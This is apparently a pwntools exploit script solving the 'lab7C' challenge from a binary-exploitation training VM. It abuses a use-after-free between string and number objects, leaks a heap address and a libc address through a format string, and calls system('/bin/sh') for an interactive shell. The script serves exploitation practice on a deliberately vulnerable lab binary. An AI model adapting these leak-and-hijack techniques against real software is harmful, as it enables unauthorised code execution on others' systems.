#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import subprocess
import time


context.arch = "x86"
# context.log_level = 'debug'
# context.local(aslr=False)
# context.aslr = False

context(terminal = ['terminator', '-e'])

mbe_vm = True
binary = "./lab7C"
offset1 = 2161
offset2 = 150512
if mbe_vm:
    offset1 = 0x2663
    offset2 = 0x28d70
    binary = "/levels/lab07/lab7C"

IP = '10.11.12.13'
PORT = 1337
local = True
if not local:
    r = remote(IP, PORT)
else:
    r = process(binary)


gdbscript_file = 'lab7C.gdb.txt'
f = open(gdbscript_file, 'w')
f.write('''
break small_str
break big_str
continue
''')
f.close()

# term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6C" %d -x "%s"' % (r.pid, gdbscript_file)])
# time.sleep(1)


def leak_libc_text_base(addr_printf_plt):
    # create string
    print r.recvuntil('-'*45)
    r.sendline("1")
    print r.readline()
    r.sendline("%35$08x")
    print r.readline()

    # delete string
    print r.recvuntil('-'*45)
    r.sendline("3")

    # create number
    print r.recvuntil('-'*45)
    r.sendline("2")
    print r.readline()
    r.sendline("%d" % addr_printf_plt)

    # print string
    print r.recvuntil('-'*45)
    r.sendline("5")
    print r.readline()
    r.sendline("1")
    line = r.readline()  # call addr
    print line
    __libc_start_main_241 = int(line.split(' ')[-1], 16)

    libc_text_base = __libc_start_main_241 - offset1

    print "##############"
    print "__libc_start_main+241: 0x%08x" % __libc_start_main_241
    print "libc_text_base: 0x%08x" % libc_text_base
    print "##############"

    # delete string
    print r.recvuntil('-'*45)
    r.sendline("4")

    return libc_text_base


def call_system(system_addr, cmd="/bin/sh"):
    # create string
    print r.recvuntil('-'*45)
    r.sendline("1")
    print r.readline()
    r.sendline(cmd)
    print r.readline()

    # delete string
    print r.recvuntil('-'*45)
    r.sendline("3")

    # create number
    print r.recvuntil('-'*45)
    r.sendline("2")
    print r.readline()
    r.sendline("%d" % system_addr)

    # print string
    print r.recvuntil('-'*45)
    r.sendline("5")
    print r.readline()
    r.sendline("1")  # call addr


# create number
print r.recvuntil('-'*45)
r.sendline("2")
print r.readline()
r.sendline("1234")
print r.readline()

# delete number
print r.recvuntil('-'*45)
r.sendline("4")
print r.readline()

# create string
print r.recvuntil('-'*45)
r.sendline("1")
print r.readline()
r.sendline("A" * 11)
print r.readline()

# delete string
print r.recvuntil('-'*45)
r.sendline("3")
print r.readline()

# print number
print r.recvuntil('-'*45)
r.sendline("6")
print r.readline()
r.sendline("1")
line = r.readline()
print line

print "##############"
big_str_addr = int(line.split(':')[-1].strip())
print "big_str: 0x%08x" % big_str_addr
print "##############"

# Leaked big_str_addr
printf_plt = big_str_addr - 918

libc_text = leak_libc_text_base(printf_plt)
system = libc_text + offset2
print "system: 0x%08x" % system
call_system(system)
r.interactive()
